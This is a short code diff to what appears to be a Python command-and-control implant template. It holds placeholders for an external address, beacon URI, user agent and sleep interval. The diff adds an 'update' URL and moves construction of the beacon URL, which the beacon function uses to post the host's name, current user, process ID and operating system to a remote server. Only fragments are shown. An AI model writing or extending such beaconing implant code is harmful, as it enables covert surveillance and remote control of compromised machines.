@@ -5,8 +5,11 @@ external_address = "EXTERNAL_ADDRESS"
 port = "PORT"
 protocol = "PROTOCOL"
 beacon_uri = "BEACON_URI"
+update_uri = "UPDATE_URI"
 user_agent = "USER_AGENT"
 sleep_interval = "SLEEP_INTERVAL"
+beacon_url = protocol + "://" + external_address + "/" + beacon_uri
+update_url = protocol + "://" + external_address + "/" + update_uri
 
 
 def get_system_info():
@@ -23,8 +26,6 @@ def get_system_info():
 
 
 def beacon(hostname, current_user, process_id, operating_system):
-    beacon_url = protocol + "://" + external_address + "/" + beacon_uri
-
     post_data = {
         "hostname": hostname,
         "current_user": current_user,
